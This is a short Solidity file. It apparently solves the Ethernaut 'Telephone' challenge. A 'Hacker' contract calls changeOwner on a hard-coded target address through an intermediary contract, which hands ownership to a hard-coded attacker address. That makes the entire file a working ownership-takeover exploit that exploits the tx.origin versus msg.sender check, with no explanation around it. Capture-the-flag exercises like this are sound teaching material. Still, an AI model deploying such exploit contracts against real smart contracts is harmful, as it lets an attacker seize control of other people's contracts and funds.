pragma solidity ^0.5.0;

contract Telephone
{
    function changeOwner(address _owner) public {}
}

contract Hacker
{
    Telephone tel = Telephone(0x569E9e936cd947A62257aa70B7cE1E9151D36F2c);
    
    function exploit () public
    {
        tel.changeOwner(0x9A9fb038269D12E4933DA138ee8CD4adec33F376);
    }
}
